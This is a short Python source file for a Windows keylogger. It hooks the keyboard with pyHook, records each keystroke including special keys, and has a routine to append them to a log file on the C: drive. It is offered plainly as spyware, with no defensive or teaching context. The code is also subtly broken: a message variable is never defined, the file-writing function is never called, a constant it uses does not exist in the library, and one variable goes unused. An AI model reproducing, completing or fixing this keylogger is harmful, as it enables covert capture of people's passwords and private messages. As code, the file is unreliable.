import os
import sys
import ctypes
import pyHook
from ctypes import wintypes

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

target_pid = os.getpid()

keystrokes = ''
file_path = 'C:\\keylog.txt'  # specify your file path here

def OnKeyboardEvent(event):
    global keystrokes
    if event.KeyID == 27: # ESC key pressed
        return False
    elif event.Ascii > 31 and event.Ascii < 128:
        keystrokes += chr(event.Ascii)
    else:
        keystrokes += '[' + event.Key + ']'
    return True

def write_to_file():
    global keystrokes
    try:
        with open(file_path, 'a') as f:
            f.write(keystrokes)
            print('[+] Keystroke data written to file:', file_path)  # optional debug print
    except Exception as e:
        print('[-] Error writing to file:', str(e)) 
        sys.exit()
    finally:
        keystrokes = ''

def main():
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
        if msg.message == wintypes.WM_QUIT:
            break
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    kernel32.ExitProcess(0)

if __name__ == '__main__':
    main()